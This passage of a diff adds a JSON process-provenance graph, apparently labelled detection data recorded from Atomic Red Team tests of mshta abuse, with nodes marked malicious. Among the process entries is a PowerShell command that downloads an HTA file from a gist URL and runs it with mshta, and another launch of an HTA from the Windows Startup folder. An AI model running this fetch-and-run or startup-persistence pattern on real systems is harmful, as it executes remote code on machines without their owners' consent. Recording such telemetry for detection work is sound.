+        "guid": "{732C744F-3235-6010-C5A2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{732C744F-323A-6010-C8A2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\SysWOW64\\mshta.exe",
+        "guid": "{732C744F-323A-6010-C8A2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{732C744F-2806-600F-D682-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "explorer",
+        "image": "%WINDIR%\\explorer.exe",
+        "guid": "{732C744F-2806-600F-D682-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{732C744F-3254-6010-D0A2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "command_line": "\"C:\\Windows\\system32\\mshta.exe\" \"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{732C744F-3254-6010-D0A2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{732C744F-3254-6010-CFA2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{732C744F-3254-6010-CFA2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:bc0a801678cdbd3b",
+      "type": "File",
+      "properties": {
+        "path": "%USER%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta",
+        "path_normalized": "c:\\users\\[user]\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\t1218.005.hta"
+      }
+    },
+    {
+      "id": "File:c198ca25f6f29ba2",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\2\\__psscriptpolicytest_4v2z4znb.5vt.ps1"
+      }
+    },
+    {
+      "id": "Process:{732C744F-31A3-6010-A2A2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{732C744F-31A3-6010-A2A2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:8e8fb8f057a53c8f",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\\"
+      }
+    },
+    {
+      "id": "File:6ebb17e3011d9660",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\2\\art-err.txt",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\2\\art-err.txt"
+      }
+    },
+    {
+      "id": "File:fd63a970d9a063c9",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\2\\art-out.txt",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\2\\art-out.txt"
+      }
+    },
+    {
+      "id": "Process:{732C744F-3255-6010-D1A2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c calc.exe",
+        "parent_image": "%WINDIR%\\System32\\mshta.exe",
+        "guid": "{732C744F-3255-6010-D1A2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{732C744F-3267-6010-DFA2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {$var =Invoke-WebRequest \\\"\"https://gist.githubusercontent.com/MHaggis/a008d2d6a84fd7a28bee0135dcf28802/raw/f4750734bd61bad087b54c5a3c4fa4e6d9fd1b94/test.hta\\\"\"\n$var.content|out-file \\\"\"c:\\temp\\test.hta\\\"\"\nmshta \\\"\"c:\\temp\\test.hta\\\"\"} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{732C744F-3267-6010-DFA2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:0961b32756d7a709",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://gist.githubusercontent.com/MHaggis/a008d2d6a84fd7a28bee0135dcf28802/raw/f4750734bd61bad087b54c5a3c4fa4e6d9fd1b94/test.hta\\"
+      }
+    },
+    {
+      "id": "File:72e8790fa068e48b",
+      "type": "File",
+      "properties": {
+        "path": "%TEMP%\\PSScriptPolicyTest\\[Aggregated]",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\2\\__psscriptpolicytest_n4l0awmo.r3m.ps1"
+      }
+    },
+    {
+      "id": "Process:{732C744F-3269-6010-E1A2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\System32\\cmd.exe\" /c calc.exe",
+        "parent_image": "%WINDIR%\\explorer.exe",
+        "guid": "{732C744F-3269-6010-E1A2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{732C744F-3269-6010-E0A2-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "mshta",
+        "image": "%WINDIR%\\System32\\mshta.exe",
+        "command_line": "\"C:\\Windows\\system32\\mshta.exe\" c:\\temp\\test.hta",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{732C744F-3269-6010-E0A2-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:bce3200a6c06a77e",
+      "type": "File",
+      "properties": {
+        "path": "C:\\Temp\\test.hta",
+        "path_normalized": "c:\\temp\\test.hta"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "source": "Process:{7901BC46-5350-6008-1F06-00000000A301}",
+      "target": "Process:{7901BC46-5350-6008-2006-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:12.414511000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5351-6008-2306-00000000A301}",
+      "target": "Process:{7901BC46-5351-6008-2606-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:13.941362500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5351-6008-2206-00000000A301}",
+      "target": "Process:{7901BC46-5351-6008-2606-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:13.868978800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5352-6008-2B06-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:14.295255700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5351-6008-2806-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2906-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:14.059124600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5351-6008-2606-00000000A301}",
+      "target": "File:e9848c7a3d167aac",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T15:59:14.019567000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5353-6008-3006-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:15.739483500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5353-6008-2F06-00000000A301}",
+      "target": "Process:{7901BC46-5353-6008-3006-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:15.653547400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4986-6008-0C00-00000000A301}",
+      "target": "Process:{7901BC46-5353-6008-2F06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:15.600159700Z",
+      "access_count": 6,
+      "last_timestamp": "2021-01-20T16:09:47.832670800Z"
+    },
+    {
+      "source": "Process:{7901BC46-5355-6008-3506-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:17.116992100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5354-6008-3406-00000000A301}",
+      "target": "Process:{7901BC46-5355-6008-3506-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:17.033935000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5356-6008-3A06-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:18.464885900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5356-6008-3906-00000000A301}",
+      "target": "Process:{7901BC46-5356-6008-3A06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:18.381616300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5357-6008-3F06-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:19.802410100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5357-6008-3E06-00000000A301}",
+      "target": "Process:{7901BC46-5357-6008-3F06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:19.721128900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5359-6008-4406-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:21.173831500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5359-6008-4306-00000000A301}",
+      "target": "Process:{7901BC46-5359-6008-4406-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:21.090412200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-535A-6008-4706-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:22.420516600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-535B-6008-4A06-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:23.755398200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-535D-6008-4D06-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:25.104217600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-535E-6008-5006-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:26.472089500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-535F-6008-5306-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:27.822198600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5361-6008-5606-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:29.157819500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4986-6008-0C00-00000000A301}",
+      "target": "Process:{7901BC46-5361-6008-5606-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:29.086574800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5362-6008-5906-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:30.343994200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4986-6008-0C00-00000000A301}",
+      "target": "Process:{7901BC46-5362-6008-5906-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:30.273467600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5363-6008-5C06-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:31.722242200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4986-6008-0C00-00000000A301}",
+      "target": "Process:{7901BC46-5363-6008-5C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:31.650094400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5364-6008-5F06-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:32.912378400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4986-6008-0C00-00000000A301}",
+      "target": "Process:{7901BC46-5364-6008-5F06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:32.841209300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5366-6008-6206-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:34.300420600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4986-6008-0C00-00000000A301}",
+      "target": "Process:{7901BC46-5366-6008-6206-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:34.230221700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5367-6008-6506-00000000A301}",
+      "target": "Process:{7901BC46-5367-6008-6606-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:35.688201900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5368-6008-6806-00000000A301}",
+      "target": "Process:{7901BC46-5367-6008-6606-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:37.034070900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-536A-6008-6B06-00000000A301}",
+      "target": "Process:{7901BC46-5367-6008-6606-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:38.385027600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-536B-6008-6E06-00000000A301}",
+      "target": "Process:{7901BC46-5367-6008-6606-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:39.732248800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-536C-6008-7106-00000000A301}",
+      "target": "Process:{7901BC46-5367-6008-6606-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:41.070732000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-536E-6008-7406-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:42.410623300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-536F-6008-7706-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:43.752165800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5371-6008-7A06-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:45.104853500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5372-6008-7D06-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:46.451450800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5373-6008-8006-00000000A301}",
+      "target": "Process:{7901BC46-5352-6008-2C06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T15:59:47.788468800Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5382-6008-8306-00000000A301}",
+      "target": "Process:{7901BC46-5382-6008-8406-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:00:02.137077700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-538F-6008-8D06-00000000A301}",
+      "target": "Process:{7901BC46-538F-6008-8E06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:00:15.606850200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-538F-6008-8E06-00000000A301}",
+      "target": "File:d6c84384a2093a73",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:00:16.101655100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4FA9-6008-4305-00000000A301}",
+      "target": "Process:{7901BC46-53CF-6008-9B06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:01:19.968725700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-53CF-6008-9B06-00000000A301}",
+      "target": "Network:f69b3a4e74b8b840",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2021-01-20T16:01:19.968725700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4FA9-6008-4305-00000000A301}",
+      "target": "File:a9abe70364480e79",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:01:19.966104500Z",
+      "access_count": 2,
+      "last_timestamp": "2021-01-20T16:01:38.339517500Z"
+    },
+    {
+      "source": "Process:{7901BC46-4FA9-6008-4305-00000000A301}",
+      "target": "File:732f8e2af3e43fa4",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:01:19.965098000Z",
+      "access_count": 2,
+      "last_timestamp": "2021-01-20T16:01:38.338357800Z"
+    },
+    {
+      "source": "Process:{7901BC46-4FA9-6008-4305-00000000A301}",
+      "target": "File:a94ff93e06f728ee",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:01:19.192591600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-53CF-6008-9B06-00000000A301}",
+      "target": "File:8203cbaa0e31f1e8",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:01:20.761605200Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-53D1-6008-A006-00000000A301}",
+      "target": "Network:f69b3a4e74b8b840",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2021-01-20T16:01:21.866204300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-53CF-6008-9B06-00000000A301}",
+      "target": "File:474bce42af619a39",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:01:21.658346500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-53CF-6008-9B06-00000000A301}",
+      "target": "File:a15a20aa773cbfca",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:01:21.455567400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-53D1-6008-A006-00000000A301}",
+      "target": "File:967b865e13957009",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:01:22.300192700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-53D1-6008-A006-00000000A301}",
+      "target": "Network:bc22f587c8116e9b",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2021-01-20T16:01:23.800657100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4FA9-6008-4305-00000000A301}",
+      "target": "Process:{7901BC46-53E2-6008-A306-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:01:38.342054400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-53E3-6008-A806-00000000A301}",
+      "target": "Process:{7901BC46-53E3-6008-A906-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:01:39.633628700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4986-6008-0C00-00000000A301}",
+      "target": "Process:{7901BC46-53E3-6008-A806-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:01:39.253099000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-53E2-6008-A306-00000000A301}",
+      "target": "File:18837eee575ce1a5",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:01:39.017813000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4FA9-6008-4305-00000000A301}",
+      "target": "File:7194d3da044a955c",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:03:04.010024100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5457-6008-BD06-00000000A301}",
+      "target": "Process:{7901BC46-5457-6008-BE06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:03:35.626002100Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-5466-6008-C006-00000000A301}",
+      "target": "Process:{7901BC46-5467-6008-C106-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:03:51.011792500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-54A4-6008-CA06-00000000A301}",
+      "target": "Process:{7901BC46-54A4-6008-CB06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:04:52.934623500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-4986-6008-0C00-00000000A301}",
+      "target": "Process:{7901BC46-54A4-6008-CA06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:04:52.863326300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-54A4-6008-CB06-00000000A301}",
+      "target": "File:5d29ad639d8891a9",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:04:53.000926000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-55CB-6008-F206-00000000A301}",
+      "target": "Process:{7901BC46-55CB-6008-F306-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:09:47.887556000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-55CB-6008-F306-00000000A301}",
+      "target": "Process:{7901BC46-55CC-6008-F406-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:09:48.726790000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-55CC-6008-F406-00000000A301}",
+      "target": "File:6f1a3f61a6cb2c45",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:09:49.494306500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-55FA-6008-FD06-00000000A301}",
+      "target": "Process:{7901BC46-55FA-6008-FE06-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-20T16:10:34.538326600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{7901BC46-55FA-6008-FE06-00000000A301}",
+      "target": "File:d6b73cb01c0148ca",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-20T16:10:35.037670300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3235-6010-C5A2-00000000A301}",
+      "target": "Process:{732C744F-3235-6010-C6A2-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-26T15:16:05.314907900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-323A-6010-C8A2-00000000A301}",
+      "target": "Process:{732C744F-3235-6010-C6A2-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-26T15:16:10.573127900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-2806-600F-D682-00000000A301}",
+      "target": "Process:{732C744F-323A-6010-C8A2-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-26T15:16:10.475818000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3254-6010-CFA2-00000000A301}",
+      "target": "Process:{732C744F-3254-6010-D0A2-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-26T15:16:36.846661300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3254-6010-CFA2-00000000A301}",
+      "target": "File:bc0a801678cdbd3b",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-26T15:16:36.840569400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3254-6010-CFA2-00000000A301}",
+      "target": "File:c198ca25f6f29ba2",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-26T15:16:36.366243000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-31A3-6010-A2A2-00000000A301}",
+      "target": "Process:{732C744F-3254-6010-CFA2-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-26T15:16:36.316556000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3254-6010-CFA2-00000000A301}",
+      "target": "Network:8e8fb8f057a53c8f",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2021-01-26T15:16:36.316556000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-31A3-6010-A2A2-00000000A301}",
+      "target": "File:6ebb17e3011d9660",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-26T15:16:36.313881700Z",
+      "access_count": 2,
+      "last_timestamp": "2021-01-26T15:16:55.498076400Z"
+    },
+    {
+      "source": "Process:{732C744F-31A3-6010-A2A2-00000000A301}",
+      "target": "File:fd63a970d9a063c9",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-26T15:16:36.312858300Z",
+      "access_count": 2,
+      "last_timestamp": "2021-01-26T15:16:55.496428300Z"
+    },
+    {
+      "source": "Process:{732C744F-3254-6010-D0A2-00000000A301}",
+      "target": "Process:{732C744F-3255-6010-D1A2-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-26T15:16:37.046346400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-31A3-6010-A2A2-00000000A301}",
+      "target": "Process:{732C744F-3267-6010-DFA2-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-26T15:16:55.504960600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3267-6010-DFA2-00000000A301}",
+      "target": "Network:0961b32756d7a709",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2021-01-26T15:16:55.504960600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3267-6010-DFA2-00000000A301}",
+      "target": "File:72e8790fa068e48b",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-26T15:16:56.413499000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-2806-600F-D682-00000000A301}",
+      "target": "Process:{732C744F-3269-6010-E1A2-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-26T15:16:57.693063600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3267-6010-DFA2-00000000A301}",
+      "target": "Process:{732C744F-3269-6010-E0A2-00000000A301}",
+      "relation": "CREATED",
+      "timestamp": "2021-01-26T15:16:57.512687000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3267-6010-DFA2-00000000A301}",
+      "target": "File:bce3200a6c06a77e",
+      "relation": "CREATED_FILE",
+      "timestamp": "2021-01-26T15:16:57.506458900Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{732C744F-3267-6010-DFA2-00000000A301}",
+      "target": "Network:bc22f587c8116e9b",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2021-01-26T15:16:59.079637300Z",
+      "access_count": 1
+    }
+  ]
+}
